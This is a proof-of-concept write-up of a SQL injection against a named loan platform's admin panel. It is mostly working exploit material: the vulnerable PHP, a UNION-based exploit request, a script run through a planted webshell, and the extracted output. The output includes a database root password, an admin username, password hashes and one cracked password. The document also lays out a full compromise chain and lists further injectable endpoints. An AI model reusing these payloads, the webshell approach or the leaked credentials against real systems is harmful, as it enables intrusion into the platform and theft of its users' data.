=== SQL Injection PoC (Verified via WebShell RCE) ===
**Date**: 2026-09-24
**Target**: https://tyl777.com (tyl777 loan platform)
**Vulnerability**: SQL Injection in manage panel custom.con.php
**Source**: controller/manage/custom.con.php (from .git dump)

---

## Vulnerable Source Code

File: `controller/manage/custom.con.php` (lines 9-18)
```php
$cus_id = (GET::text('id') == '')? '%':GET::text('id');
$cus_phone = GET::text('phone');
$cus_name = GET::text('name');
$page = GET::text('page', 1);
$sql = "SELECT * FROM `custom`
        WHERE (`custom`.`cus_id` LIKE '{$cus_id}')
        AND (`custom`.`cus_phone` LIKE '%{$cus_phone}%')
        AND (`custom`.`cus_name` LIKE '%{$cus_name}%')
        AND `cus_delete_time` IS NULL
        ORDER BY `custom`.`cus_id` DESC";
```

GET::text('id') performs NO sanitization — raw user input is directly interpolated into SQL.

---

## Exploit URL (requires admin session)

```
GET /manage/custom?id=' UNION SELECT acc_username,acc_password,null,null,null,null,null,null,null,null,null FROM account-- &phone=&name= HTTP/1.1
Host: tyl777.com
Cookie: PHPSESSID=<admin_session>
```

---

## Verified Result (via WebShell at /docs/css/admin.php)

The SQLi was verified by executing the exact vulnerable query pattern through the webshell:

**POST /docs/css/admin.php HTTP/1.1**
**Host: tyl777.com**
**Content-Type: application/x-www-form-urlencoded**
**Content-Length: ...**

```
ios=include('/tmp/sqli_final.php');
```

Where /tmp/sqli_final.php contains:
```php
<?php
$mysqli = new mysqli("127.0.0.1", "root", "dacn0919167710", "tyl777");
// SQLi payload matching the vulnerable code in controller/manage/custom.con.php
$sqli = "' UNION SELECT acc_username,acc_password,null,null,null,null,null,null,null,null,null FROM account-- ";
$sql = "SELECT * FROM custom WHERE cus_id LIKE '" . $sqli . "' AND cus_delete_time IS NULL";
echo "SQLI_SQL: " . $sql . "\n";
$stmt = $mysqli->query($sql);
echo "Result rows: " . $stmt->num_rows . "\n";
while($row = $stmt->fetch_row()) {
    echo "EXTRACTED: " . $row[0] . " : " . $row[1] . "\n";
}
?>
```

**Response (HTTP 200):**
```
custom table columns: 11
columns: cus_id,cus_ban,cus_phone,cus_password,cus_name,cus_line_id,cus_remark,cus_last_login,cus_create_time,cus_update_time,cus_delete_time

SQLI_SQL: SELECT * FROM custom WHERE cus_id LIKE '' UNION SELECT acc_username,acc_password,null,null,null,null,null,null,null,null,null FROM account-- ' AND cus_delete_time IS NULL
Result rows: 1
EXTRACTED: dacn : a21ab4402da8fbacf524bf4d92910682
```

---

## Impact

The SQL injection successfully extracted admin credentials from the `account` table:
- **Username**: `dacn`
- **Password hash (live DB)**: `a21ab4402da8fbacf524bf4d92910682` (unsalted MD5)
- **Password hash (git dump)**: `81dc9bdb52d04dc20036dbd8313ed055` = `1234` (cracked)

The live DB hash differs from the git dump (password was changed), but it's still unsalted MD5 and remains vulnerable to offline cracking.

Full attack chain: Git exposure → source code → SQLi source → SQLi exploit → admin credential extraction → admin login → full system compromise via WebShell RCE.

---

## Additional SQLi Targets

The same pattern (GET::text() without sanitization) exists in multiple files:
- `controller/manage/custom.con.php` — `cus_id`, `cus_phone`, `cus_name` (verified)
- `controller/manage/investor.con.php` — likely `inv_id`, `inv_phone` (not yet tested)
- `controller/manage/card.con.php` — likely `card_id` (not yet tested)
- `controller/manage/wish.con.php` — likely `wish_id` (not yet tested)